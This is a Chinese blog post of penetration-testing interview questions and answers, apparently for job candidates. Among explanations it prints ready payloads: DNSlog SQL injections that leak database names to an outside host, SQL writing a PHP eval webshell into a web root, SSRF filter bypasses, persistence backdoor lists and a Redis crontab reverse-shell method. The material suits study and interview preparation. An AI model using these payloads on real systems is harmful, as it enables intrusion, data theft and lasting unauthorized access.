@@ -1,0 +1,488 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>渗透面试题 | 技术阿涛</title><meta name="author" content="XiongTaoTao"><meta name="copyright" content="XiongTaoTao"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言近期面试喜欢问的问题，总结了一下。 岗位分析整体安全行业，随着网络安全的大火，Web安全入门浅，培训机构遍地开会，大量花里胡哨的人才都争着用了进来，所以想要突出，必须要有自己的一技之长。 那么当前网络安全的技术岗位，热门方向有很多，说几个例子。    逆向    APT   代码审计   区块链   渗透（不限于内网、CS客户端，APP，小程序，微服务等）   常见面试题及参考问：MySQL写">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透面试题">
+<meta property="og:url" content="http://example.com/2020/03/24/%E6%B8%97%E9%80%8F%E9%9D%A2%E8%AF%95%E9%A2%98/index.html">
+<meta property="og:site_name" content="技术阿涛">
+<meta property="og:description" content="前言近期面试喜欢问的问题，总结了一下。 岗位分析整体安全行业，随着网络安全的大火，Web安全入门浅，培训机构遍地开会，大量花里胡哨的人才都争着用了进来，所以想要突出，必须要有自己的一技之长。 那么当前网络安全的技术岗位，热门方向有很多，说几个例子。    逆向    APT   代码审计   区块链   渗透（不限于内网、CS客户端，APP，小程序，微服务等）   常见面试题及参考问：MySQL写">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg">
+<meta property="article:published_time" content="2020-03-24T01:37:52.000Z">
+<meta property="article:modified_time" content="2020-03-24T03:03:38.249Z">
+<meta property="article:author" content="XiongTaoTao">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="面试题">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2020/03/24/%E6%B8%97%E9%80%8F%E9%9D%A2%E8%AF%95%E9%A2%98/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '渗透面试题',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2020-03-24 11:03:38'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="技术阿涛" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">45</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">55</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-shouyex"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-zuixinwenzhang_huaban"></i><span> 找文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw iconfont icon-fenlei1"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw iconfont icon-biaoqian1"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw iconfont icon-shijianzhou"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-shenghuo"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/guestbook/"><i class="fa-fw iconfont icon-liaotian-04"></i><span> 留言板</span></a></li><li><a class="site-page child" href="/link/"><i class="fa-fw iconfont icon-lianjie"></i><span> 友人帐</span></a></li><li><a class="site-page child" href="/share/"><i class="fa-fw iconfont icon-fenxiang"></i><span> 分享</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw iconfont icon-xiangce"></i><span> 相册</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw iconfont icon-shuji"></i><span> 书籍</span></a></li><li><a class="site-page child" href="/FilmAndTV/"><i class="fa-fw iconfont icon-yingshi1"></i><span> 影视</span></a></li><li><a class="site-page child" href="/daohang/"><i class="fa-fw iconfont icon-daohang"></i><span> 导航站</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-gerenzhongxin"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="技术阿涛"><span class="site-name">技术阿涛</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-shouyex"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-zuixinwenzhang_huaban"></i><span> 找文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw iconfont icon-fenlei1"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw iconfont icon-biaoqian1"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw iconfont icon-shijianzhou"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-shenghuo"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/guestbook/"><i class="fa-fw iconfont icon-liaotian-04"></i><span> 留言板</span></a></li><li><a class="site-page child" href="/link/"><i class="fa-fw iconfont icon-lianjie"></i><span> 友人帐</span></a></li><li><a class="site-page child" href="/share/"><i class="fa-fw iconfont icon-fenxiang"></i><span> 分享</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw iconfont icon-xiangce"></i><span> 相册</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw iconfont icon-shuji"></i><span> 书籍</span></a></li><li><a class="site-page child" href="/FilmAndTV/"><i class="fa-fw iconfont icon-yingshi1"></i><span> 影视</span></a></li><li><a class="site-page child" href="/daohang/"><i class="fa-fw iconfont icon-daohang"></i><span> 导航站</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-gerenzhongxin"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">渗透面试题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-03-24T01:37:52.000Z" title="发表于 2020-03-24 09:37:52">2020-03-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-03-24T03:03:38.249Z" title="更新于 2020-03-24 11:03:38">2020-03-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%A2%E8%AF%95%E9%A2%98/">面试题</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="渗透面试题"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>近期面试喜欢问的问题，总结了一下。</strong></p>
+<h2 id="岗位分析"><a href="#岗位分析" class="headerlink" title="岗位分析"></a>岗位分析</h2><p>整体安全行业，随着网络安全的大火，Web安全入门浅，培训机构遍地开会，大量花里胡哨的人才都争着用了进来，所以想要突出，必须要有自己的一技之长。</p>
+<p>那么当前网络安全的技术岗位，热门方向有很多，说几个例子。</p>
+<table>
+<thead>
+<tr>
+<th align="left">逆向</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>APT</strong></td>
+</tr>
+<tr>
+<td align="left"><strong>代码审计</strong></td>
+</tr>
+<tr>
+<td align="left"><strong>区块链</strong></td>
+</tr>
+<tr>
+<td align="left"><strong>渗透（不限于内网、CS客户端，APP，小程序，微服务等）</strong></td>
+</tr>
+</tbody></table>
+<h2 id="常见面试题及参考"><a href="#常见面试题及参考" class="headerlink" title="常见面试题及参考"></a>常见面试题及参考</h2><h3 id="问：MySQL写WebShell有几种方式，利用条件"><a href="#问：MySQL写WebShell有几种方式，利用条件" class="headerlink" title="问：MySQL写WebShell有几种方式，利用条件"></a>问：MySQL写WebShell有几种方式，利用条件</h3><p>答：</p>
+<p>一、</p>
+<blockquote>
+<p>union select 后写入</p>
+<p>lines terminated by 写入</p>
+<p>lines starting by 写入</p>
+<p>fields terminated by 写入</p>
+<p>COLUMNS terminated by 写入</p>
+</blockquote>
+<p>二、</p>
+<blockquote>
+<p>root权限</p>
+<p>GPC关闭（能使用单引号），magic_quotes_gpc&#x3D;On</p>
+<p>有绝对路径（读文件可以不用，写文件必须）</p>
+<p>没有配置–secure-file-priv</p>
+<p>成功条件：有读写的权限，有create、insert、select的权限</p>
+</blockquote>
+<h3 id="问：Sql-注入无回显的情况下，利用-DNSlog，mysql-下利用什么构造代码，mssql-下又如何？"><a href="#问：Sql-注入无回显的情况下，利用-DNSlog，mysql-下利用什么构造代码，mssql-下又如何？" class="headerlink" title="问：Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何？"></a>问：Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何？</h3><p>答：</p>
+<blockquote>
+<p>（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。</p>
+<p>（2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。</p>
+<p>（3）Mysql 中利用 load_file() 构造payload</p>
+<p>‘ and if((select load_file(concat(‘\\’,(select database()),’.xxx.ceye.io\abc’))),1,0)# </p>
+<p>（4）Mssql 下利用 master..xp_dirtree 构造payload</p>
+<p>DECLARE @host varchar(1024);SELECT @host&#x3D;(SELECT db_name())+’.xxx.ceye.io’;EXEC(‘master..xp_dirtree”\’+@host+’\foobar$”‘);</p>
+</blockquote>
+<h3 id="问：phpmyadmin写sehll的方法"><a href="#问：phpmyadmin写sehll的方法" class="headerlink" title="问：phpmyadmin写sehll的方法"></a>问：phpmyadmin写sehll的方法</h3><p>答：</p>
+<p>一、常规导入shell的操作</p>
+<blockquote>
+<p>创建数据表导出shell</p>
+<p>CREATE TABLE <code>mysql</code>.<code>shadow9</code> (<code>content</code> TEXT NOT NULL );</p>
+<p>INSERT INTO <code>mysql</code>.<code>shadow9</code> (<code>content</code> ) VALUES (‘<?php @eval($_POST[pass]);?>’);</p>
+<p>SELECT <code>content</code> FROM <code>shadow9</code> INTO OUTFILE ‘C:\phpStudy\WWW\90sec.php’;</p>
+<p>DROP TABLE IF EXISTS <code>shadow9</code>;</p>
+</blockquote>
+<p>二、一句话导出shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_POST[pass]);?&gt;&#x27; into outfile &#x27;c:/phpstudy/www/90sec.php&#x27;;   select &#x27;&lt;?php @eval($_POST[pass]);?&gt;&#x27; into outfile &#x27;c:\\phpstudy\\www\\90sec.php&#x27;; select &#x27;&lt;?php @eval($_POST[pass]);?&gt;&#x27; into dumpfile &#x27;c:\\phpstudy\\www\\bypass.php&#x27;;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>三、日志备份获取shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &quot;%genera%&quot;;          //查询general_log配置 set global general_log=&#x27;on&#x27;;              //开启general log模式 SET global general_log_file=&#x27;D:/phpStudy/WWW/cmd.php&#x27;;    //设置日志文件保存路径 SELECT &#x27;&lt;?php phpinfo();?&gt;&#x27;;              //phpinfo()写入日志文件 set global general_log=&#x27;off&#x27;;              //关闭general_log模式</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="问：权限维持的方法"><a href="#问：权限维持的方法" class="headerlink" title="问：权限维持的方法"></a>问：权限维持的方法</h3><p>答：</p>
+<p>留自启动后门方法很多,大多数都添加到服务,加注册表 加启动项，</p>
+<p><strong>windows：</strong></p>
+<blockquote>
+<p>1.替换系统文件类(shift后门,放大镜后门)</p>
+<p>2.修改注册表类</p>
+<p>自启动项、屏幕保护程序注册表、用户登陆初始化、登录脚本、映像劫持、影子账户、AppCertDlls注册表项、AppInit_DLLs注册表项、文件关联、用户登陆初始化、xx.Netsh Helper DLL</p>
+<p>3.文件类</p>
+<p>自启动文件夹、office Word StartUp劫持</p>
+<p>4.计划任务</p>
+<p>schtasks 、WMI、bitsadmin</p>
+</blockquote>
+<p><strong>Linux</strong></p>
+<blockquote>
+<p>1.预加载型动态链接库后门</p>
+<p>2.strace后门</p>
+<p>3.SSH 后门</p>
+<p>4.SUID后门</p>
+<p>5.inetd服务后门</p>
+<p>6.协议后门</p>
+<p>7.vim后门</p>
+<p>8.PAM后门</p>
+<p>9.进程注入</p>
+<p>10.Rootkit</p>
+<p>11.端口复用</p>
+</blockquote>
+<p><strong>MSF权限维持</strong></p>
+<blockquote>
+<p>1.Persistence模块</p>
+<p>2.Metsvc 模块</p>
+</blockquote>
+<p><strong>Powershell权限维持</strong></p>
+<p><strong>CS权限维持</strong></p>
+<blockquote>
+<p>SC命令</p>
+</blockquote>
+<h3 id="问：XXE-漏洞原理，代码审计如何寻找？"><a href="#问：XXE-漏洞原理，代码审计如何寻找？" class="headerlink" title="问：XXE 漏洞原理，代码审计如何寻找？"></a>问：XXE 漏洞原理，代码审计如何寻找？</h3><p>答：</p>
+<p>（1）XXE （XML 外部实体注入）当 应用允许引用 XML 外部实体时，攻击者通过构造恶意内容，就可能进行任意文件读取、系统命令执行、内网端口探测、内网网站攻击等操作。</p>
+<p>支持的协议如下图：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20200228/1582890916_5e58ffa4c2932.png"><img src="https://image.3001.net/images/20200228/1582890916_5e58ffa4c2932.png!small" alt="img"></a></p>
+<p><strong>Java</strong> :支持http、https、file、ftp、mailto、jar、netdoc、（1.8不支持gopher）</p>
+<p>（2）审计函数，涉及到XML文件处理，都可能造成 XXE</p>
+<p>（3）防御方法：禁用外部实体</p>
+<h3 id="问：SSRF-禁用-127-0-0-1-后如何绕过，支持哪些协议？"><a href="#问：SSRF-禁用-127-0-0-1-后如何绕过，支持哪些协议？" class="headerlink" title="问：SSRF 禁用 127.0.0.1 后如何绕过，支持哪些协议？"></a>问：SSRF 禁用 127.0.0.1 后如何绕过，支持哪些协议？</h3><p>答：</p>
+<blockquote>
+<p>(1)利用进制转换</p>
+<p>(2)利用DNS解析</p>
+<p>(3)利用句号（127。0。0。1）</p>
+<p>(4)利用[::]（http:&#x2F;&#x2F;[::]:80&#x2F;）；</p>
+<p>(5)利用@（<a target="_blank" rel="noopener" href="http://example.com@127.0.0.1/">http:&#x2F;&#x2F;example.com@127.0.0.1</a>）；</p>
+<p>(6)利用短地址（<a target="_blank" rel="noopener" href="http://dwz.cn/11SMa%EF%BC%89%EF%BC%9B">http://dwz.cn/11SMa）；</a></p>
+<p>(7)协议（Dict:&#x2F;&#x2F;、SFTP:&#x2F;&#x2F;、TFTP:&#x2F;&#x2F;、LDAP:&#x2F;&#x2F;、Gopher:&#x2F;&#x2F;）</p>
+</blockquote>
+<h3 id="问：应急响应如何查找挖矿病毒，如何通过进程找到挖矿文件"><a href="#问：应急响应如何查找挖矿病毒，如何通过进程找到挖矿文件" class="headerlink" title="问：应急响应如何查找挖矿病毒，如何通过进程找到挖矿文件"></a>问：应急响应如何查找挖矿病毒，如何通过进程找到挖矿文件</h3><p>答：</p>
+<blockquote>
+<p>(1)任务管理器netstat -anp寻找异常进程PID看端口信息，然后根据端口信息定位到文件，cd &#x2F;proc&#x2F;PID （ls -l查看），</p>
+<p>禁用可疑的服务项。</p>
+<p>(2)windows还可以用wmic分析进程参数</p>
+</blockquote>
+<h3 id="问：struts2框架漏洞原理"><a href="#问：struts2框架漏洞原理" class="headerlink" title="问：struts2框架漏洞原理"></a>问：struts2框架漏洞原理</h3><p>答：</p>
+<blockquote>
+<p>(1)struts是java的web框架</p>
+<p>(2)采取OGNL表达式，处理view层数据字符串到controller层转换成java对象</p>
+<p>(3)重点关注的编号加粗如下</p>
+</blockquote>
+<p>S2-057 影响范围非常小</p>
+<p>S2-048 影响范围非常小</p>
+<p><strong>S2-046 和S2-045一样</strong></p>
+<p><strong>S2-045 影响范围较大—-通过Content-Type这个header头，进而执行命令，通过Strus2对错误消息处理进行回显</strong></p>
+<p>S2-037 影响范围小</p>
+<p>S2-032 影响范围小</p>
+<p>S2-020 影响范围小</p>
+<p>S2-019 影响范围一般</p>
+<p><strong>S2-016 影响范围非常大</strong></p>
+<p>S2-013 S2-016范围内</p>
+<p>S2-009 S2-016范围内</p>
+<p>S2-005 S2-016范围内</p>
+<h3 id="问：JAVA反序列化原理"><a href="#问：JAVA反序列化原理" class="headerlink" title="问：JAVA反序列化原理"></a>问：JAVA反序列化原理</h3><p>答：</p>
+<blockquote>
+<p>（1）Java序列化指Java对象转换为字节序列的过程</p>
+<p>（2）Java反序列化指字节序列恢复为Java对象的过程</p>
+<p>（3） Commons-collections 爆出第一个漏洞开始，Java反序列化漏洞的事件就层出不穷。</p>
+<p>（4）在Java中,利用ObjectInputStream的readObject方法进行对象读取</p>
+<p>（5）可以深入了解 ysoserial有哪些gadgets</p>
+</blockquote>
+<h3 id="问：cors如何产生，有哪些利用方式？绕过同源策略的方法有哪些？jsonp跨域如何利用？"><a href="#问：cors如何产生，有哪些利用方式？绕过同源策略的方法有哪些？jsonp跨域如何利用？" class="headerlink" title="问：cors如何产生，有哪些利用方式？绕过同源策略的方法有哪些？jsonp跨域如何利用？"></a><strong>问：cors如何产生，有哪些利用方式？绕过同源策略的方法有哪些？jsonp跨域如何利用？</strong></h3><p>答：</p>
+<p>（1）CORS全称是”跨域资源共享”（Cross-origin resource sharing）,Origin源未严格，从而造成跨域问题,允许浏览器向跨源服务器，发出<a target="_blank" rel="noopener" href="http://www.ruanyifeng.com/blog/2012/09/xmlhttprequest_level_2.html">XMLHttpRequest</a>请求</p>
+<p>（2）Origin为*的时候，使用curl测试CORS，</p>
+<p>curl <url> -H “Origin: <a target="_blank" rel="noopener" href="https://evil.com/">https://evil.com</a>” -I</p>
+<p>再寻找的api接口是否有敏感信息泄漏。</p>
+<p>（3）同源：协议相同、域名相同、端口相同，绕过同源策略限制的方法：</p>
+<blockquote>
+<p>1、document.domain属性</p>
+<p>2、片段识别符（URL后加#号）</p>
+<p>3、window.name</p>
+<p>4、跨文档通信API</p>
+<p>5、JSONP</p>
+<p>6、CORS</p>
+<p>7、WebSockets</p>
+</blockquote>
+<p>（4）jsonp跨域利用：获取JSON数据并编码发送到远程服务器上</p>
+<h3 id="问：phar协议如何利用，php伪协议input与post数据包发送有什么区别？"><a href="#问：phar协议如何利用，php伪协议input与post数据包发送有什么区别？" class="headerlink" title="问：phar协议如何利用，php伪协议input与post数据包发送有什么区别？"></a>问：phar协议如何利用，php伪协议input与post数据包发送有什么区别？</h3><p>答：</p>
+<p>（1）可以Bypass一些waf，绕过上传限制</p>
+<p>（2）Phar反序列化，Phar:&#x2F;&#x2F; 伪协议读取phar文件时，会反序列化meta-data储存</p>
+<p>（3） 区别</p>
+<blockquote>
+<p>一、 application&#x2F;x-www-form-urlencoded 或 multipart&#x2F;form-data时</p>
+<p>php:&#x2F;&#x2F;input 中是原始数据。</p>
+<p>$_POST 中是关联数组，且没有上传控件的内容。</p>
+<p>二、enctype&#x3D;”multipart&#x2F;form-data” 时</p>
+<p>php:&#x2F;&#x2F;input 是无效的。</p>
+<p>三、 Content-Type &#x3D; “text&#x2F;plain”时 </p>
+<p>$_POST 不能获取post的数据， php:&#x2F;&#x2F;input可以。</p>
+</blockquote>
+<h3 id="问：内网服务器，如何进行信息收集"><a href="#问：内网服务器，如何进行信息收集" class="headerlink" title="问：内网服务器，如何进行信息收集"></a>问：内网服务器，如何进行信息收集</h3><h3 id="答："><a href="#答：" class="headerlink" title="答："></a>答：</h3><p>（1）手动，用一些小工具（批量看存活）</p>
+<p>new user &#x2F;domain查域、net view看共享、hosts文件内网ip域名映射、wifi记录和密码、浏览器中的密码、敏感文件、各类服务的配置文件中信息、历史命令、ssh私钥、FTP的连接信息、xshell等ssh连接工具的session文件，3389连接历史和被连接历史信息、某些内网api接口未授权访问</p>
+<p>（2）扫描器</p>
+<p>主机扫描、端口扫描、漏洞扫描、识别内网环境、密码爆破、抓密码</p>
+<p>（3）留后门，抓信息</p>
+<h3 id="问：内网黄金票据、白银票据的区别和利用方式"><a href="#问：内网黄金票据、白银票据的区别和利用方式" class="headerlink" title="问：内网黄金票据、白银票据的区别和利用方式"></a>问：内网黄金票据、白银票据的区别和利用方式</h3><p>答：</p>
+<p>（1）白银票据：抓取到了域控服务hash的情况下，在客户端以一个普通域用户的身份生成TGS票据，并且是针对于某个机器上的某个服务的，生成的白银票据,只能访问指定的target机器中指定的服务。</p>
+<p>黄金票据：直接抓取域控中账号的hash，来在client端生成一个TGT票据，那么该票据是针对所有机器的所有服务。</p>
+<p>（2）通过mimkatz执行，导出域控中账号的Hash</p>
+<h3 id="问：docker远程api漏洞原理"><a href="#问：docker远程api漏洞原理" class="headerlink" title="问：docker远程api漏洞原理"></a>问：docker远程api漏洞原理</h3><p>答：</p>
+<p>（1）docker swarm 是一个将docker集群变成单一虚拟的docker host工具，使用标准的Docker API，能够方便docker集群的管理和扩展，该未授权访问,可以通过url操作，执行docker命令。</p>
+<p>（2）通过docker client执行目标服务器容器命令，docker是以root权限运行的</p>
+<p>一、有运行ssh服务，&#x2F;root&#x2F;.ssh目录挂载到container内，，然后修改&#x2F;.ssh&#x2F;authorized_keys 文件，把自己的public key写进去</p>
+<p>二、没有运行ssh服务，利用挂载写crontab定时任务，反弹一个shell</p>
+<h3 id="问：ssrf怎么用redis写shell"><a href="#问：ssrf怎么用redis写shell" class="headerlink" title="问：ssrf怎么用redis写shell"></a>问：ssrf怎么用redis写shell</h3><p>答：</p>
+<p>（1）SSRF服务端请求伪造</p>
+<blockquote>
+<p>一、对内网扫描，获取 banner </p>
+<p>二、攻击运行在内网的应用，主要是使用 GET 参数就可以实现的攻击（比如 Struts2，sqli 等）</p>
+<p>三、利用协议读取本地文件</p>
+<p>四、 云计算环境AWS Google Cloud 环境可以调用内网操作 ECS 的 API</p>
+</blockquote>
+<p>（2）如webligic SSRF漏洞</p>
+<p>通过SSRF的gopher协议操作内网的redis，利用redis将反弹shell写入crontab定时任务，url编码，将\r字符串替换成%0d%0a</p>
+<h3 id="问：预编译能否100-防sql注入，如果不能，写一个"><a href="#问：预编译能否100-防sql注入，如果不能，写一个" class="headerlink" title="问：预编译能否100%防sql注入，如果不能，写一个"></a><strong>问：预编译能否100%防sql注入，如果不能，写一个</strong></h3><p>答：</p>
+<p>不能。</p>
+<p>一、</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$pdo-&gt;query(&#x27;SET NAMES gbk&#x27;);</span><br><span class="line">$var = &quot;\xbf\x27 OR 1=1 /*&quot;;</span><br><span class="line">$query = &#x27;SELECT * FROM test WHERE name = ? LIMIT 1&#x27;;</span><br><span class="line">$stmt = $pdo-&gt;prepare($query);</span><br><span class="line">$stmt-&gt;execute(array($var));</span><br></pre></td></tr></table></figure>
+
+<p>类似于宽字节注入</p>
+<p>二、</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$dbh = new PDO(&quot;txf&quot;);</span><br><span class="line">$name = $_GET[&#x27;name&#x27;];</span><br><span class="line">$stmt = $dbh-&gt;prepare(&#x27;SELECT * FROM &#x27; . $name . &#x27; where username = :username&#x27;);</span><br><span class="line">$stmt-&gt;execute( array(&#x27;:username&#x27; =&gt; $_REQUEST[&#x27;username&#x27;]) );</span><br></pre></td></tr></table></figure>
+
+<p>参数name是一串数组，PDO不会生效</p>
+<p>三、</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$stmt = $dbh-&gt;prepare(&#x27;SELECT * FROM foo ORDER BY :userSuppliedData&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>PDO对DDL不生效</p>
